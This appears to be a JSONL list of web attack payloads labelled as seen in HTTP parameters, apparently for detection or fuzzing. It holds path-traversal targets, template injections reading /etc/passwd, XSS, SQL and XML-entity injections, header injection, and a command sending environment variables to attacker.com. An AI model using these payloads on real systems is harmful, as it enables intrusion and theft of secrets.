+{"rid": "s05104", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/var/log/news/suck.notice"}}
+{"rid": "s05134", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/var/log/apache2/error.log"}}
+{"rid": "s05164", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "&& wget"}}
+{"rid": "s05194", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/apache2/mods-enabled/mime.conf"}}
+{"rid": "s05224", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/ftphosts"}}
+{"rid": "s05254", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= global.process.platform %>"}}
+{"rid": "s05284", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<% var x = process.mainModule.require('child_process').execSync('cat /etc/passwd').toString(); %><%=x%>"}}
+{"rid": "s05314", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<abbr onbeforepaste=\"alert(1)\" contenteditable>test</abbr>"}}
+{"rid": "s05344", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))"}}
+{"rid": "s05374", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "; printenv | curl -X POST -d @- http://attacker.com"}}
+{"rid": "s05404", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/wicd/wireless-settings.conf"}}
+{"rid": "s05434", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString() %>"}}
+{"rid": "s05464", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<applet id=x tabindex=1 onactivate=alert(1)></applet>"}}
+{"rid": "s05494", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| i${x}d"}}
+{"rid": "s05524", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= process.mainModule.require('url').parse('http://example.com') %>"}}
+{"rid": "s05554", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/share/tomcat6/conf/workers.properties"}}
+{"rid": "s05584", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<img border=3 alt=jaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e>"}}
+{"rid": "s05614", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL) --"}}
+{"rid": "s05644", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| env"}}
+{"rid": "s05674", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%3b%20pwd"}}
+{"rid": "s05704", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "|| ls"}}
+{"rid": "s05734", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/apache2/apache2.conf\">]><foo>&xxe;</foo>"}}
+{"rid": "s05764", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%26%0d%0aSet-Cookie:admin=true"}}
+{"rid": "s05794", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "'%20%26%26%20this.passwordzz.match(/.*/)//+%00"}}
+{"rid": "s05824", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/local/apache22/httpd.conf"}}
